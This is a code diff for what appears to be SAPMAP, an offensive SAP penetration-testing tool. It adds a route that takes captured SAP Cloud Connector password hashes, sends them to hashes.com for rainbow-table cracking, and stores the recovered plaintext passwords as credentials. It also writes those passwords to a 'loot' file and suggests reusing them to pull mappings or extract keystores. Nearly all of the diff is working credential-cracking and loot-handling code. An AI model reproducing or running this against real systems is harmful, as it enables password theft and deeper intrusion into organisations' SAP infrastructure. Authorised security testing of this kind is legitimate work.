@@ -2061,6 +2061,152 @@ def create_app(api: SAPMAPApi) -> Bottle:
             "loot_path": users_xml_path if "users_xml_path" in dir() else "",
         })
 
+    # -- Local settings (API keys etc, stored in settings.local.json) --
+    def _get_local_setting(key: str) -> str:
+        try:
+            with open("settings.local.json") as f:
+                return json.load(f).get(key, "")
+        except Exception:
+            return ""
+
+    @app.route("/api/settings/local", method="GET")
+    def get_local_settings():
+        """Return non-sensitive local settings (API keys etc)."""
+        response.content_type = "application/json"
+        try:
+            with open("settings.local.json") as f:
+                data = json.load(f)
+        except Exception:
+            data = {}
+        # Only expose key existence, not the actual key value
+        return json.dumps({
+            "hashes_com_api_key_set": bool(data.get("hashes_com_api_key"))
+        })
+
+    @app.route("/api/settings/local", method="POST")
+    def save_local_settings():
+        """Save local settings to settings.local.json (gitignored)."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        try:
+            try:
+                with open("settings.local.json") as f:
+                    existing = json.load(f)
+            except Exception:
+                existing = {}
+            if "hashes_com_api_key" in data:
+                existing["hashes_com_api_key"] = data["hashes_com_api_key"]
+            with open("settings.local.json", "w") as f:
+                json.dump(existing, f, indent=2)
+            os.chmod("settings.local.json", 0o600)
+            return json.dumps({"ok": True})
+        except Exception as e:
+            return json.dumps({"ok": False, "error": str(e)})
+
+    @app.route("/api/scc/<host>/lookup_hashes_online", method="POST")
+    def scc_lookup_hashes_online(host):
+        """Look up SCC password hashes against hashes.com rainbow tables.
+
+        Calls POST https://hashes.com/en/api/search with the hashes.
+        When plaintext is found, stores it as an SCC credential.
+        """
+        response.content_type = "application/json"
+        sn = api.state.scc_nodes.get(host)
+        if not sn:
+            return json.dumps({"error": f"SCC node {host} not found"})
+        data = request.json or {}
+        api_key = data.get("api_key") or _get_local_setting("hashes_com_api_key")
+        if not api_key:
+            return json.dumps({"error": "No hashes.com API key — set it in Settings"})
+        hashes_input = data.get("hashes") or []  # [{username, hash_hex, algorithm, hashcat_line}]
+        if not hashes_input:
+            return json.dumps({"error": "No hashes provided"})
+
+        import urllib.request as _urlreq2
+        import urllib.parse as _urlparse
+
+        # Build POST body: hashes[] array
+        # hashes.com expects raw hex hashes (no {SHA} prefix)
+        post_params = [("key", api_key)]
+        hash_map = {}  # hex -> {username, algorithm}
+        for h in hashes_input:
+            hex_hash = h.get("hash_hex", "").strip()
+            if not hex_hash or len(hex_hash) < 8:
+                continue
+            post_params.append(("hashes[]", hex_hash))
+            hash_map[hex_hash.lower()] = h
+
+        if not hash_map:
+            return json.dumps({"error": "No valid hex hashes to look up"})
+
+        try:
+            body = _urlparse.urlencode(post_params).encode()
+            req = _urlreq2.Request(
+                "https://hashes.com/en/api/search",
+                data=body,
+                method="POST",
+                headers={"Content-Type": "application/x-www-form-urlencoded",
+                         "User-Agent": "SAPMAP/1.0"}
+            )
+            import ssl as _ssl2
+            ctx = _ssl2.create_default_context()
+            with _urlreq2.urlopen(req, timeout=15, context=ctx) as r:
+                resp_body = r.read().decode("utf-8", errors="replace")
+            resp = json.loads(resp_body)
+        except Exception as e:
+            return json.dumps({"error": f"hashes.com API error: {e}"})
+
+        if not resp.get("success"):
+            return json.dumps({"error": f"hashes.com: {resp.get('message', 'unknown error')}"})
+
+        results = []
+        cracked_count = 0
+        for item in (resp.get("list") or []):
+            hex_hash = (item.get("hash") or "").lower()
+            found = item.get("found", False)
+            plaintext = item.get("plaintext", "") if found else ""
+            original = hash_map.get(hex_hash, {})
+            username = original.get("username", "?")
+            results.append({
+                "username": username,
+                "hash_hex": hex_hash,
+                "found": found,
+                "plaintext": plaintext,
+                "algorithm": item.get("algorithm", original.get("algorithm", "")),
+            })
+            if found and plaintext:
+                cracked_count += 1
+                # Store as SCC credential (same as scc_set_credentials)
+                from sapmap_models import Credentials as _Creds
+                sn.credentials = [_Creds(username=username, password=plaintext, verified=False)]
+                print(f"[+] SCC {host}: hashes.com cracked {username} → "
+                      f"password stored as credential")
+                sapmap_findings.emit_finding(
+                    "CRITICAL", host,
+                    f"SCC password cracked for '{username}' via hashes.com rainbow table — "
+                    f"plaintext stored as SCC credential. "
+                    f"Use 'Pull Mappings' or 'Extract Keystore' without re-entering password.",
+                    ref="scc.users.password_cracked",
+                    meta={"username": username,
+                          "algorithm": item.get("algorithm", ""),
+                          "source": "hashes.com"})
+                # Also save to loot
+                try:
+                    host_slug = host.replace(":", "_").replace("/", "_")
+                    loot_dir = os.path.join("loot", "scc", host_slug)
+                    os.makedirs(loot_dir, exist_ok=True)
+                    cracked_path = os.path.join(loot_dir, "hashes_cracked.txt")
+                    with open(cracked_path, "a") as fh:
+                        fh.write(f"{username}:{plaintext}\n")
+                    os.chmod(cracked_path, 0o600)
+                except Exception:
+                    pass
+
+        cost = resp.get("cost", 0)
+        print(f"[*] SCC {host}: hashes.com lookup: {cracked_count}/{len(results)} cracked, cost={cost} credits")
+        return json.dumps({"ok": True, "results": results,
+                           "cracked": cracked_count, "cost": cost})
+
     # -- Node operations --
     @app.route("/api/node/<sid>/credentials", method="POST")
     def node_credentials(sid):
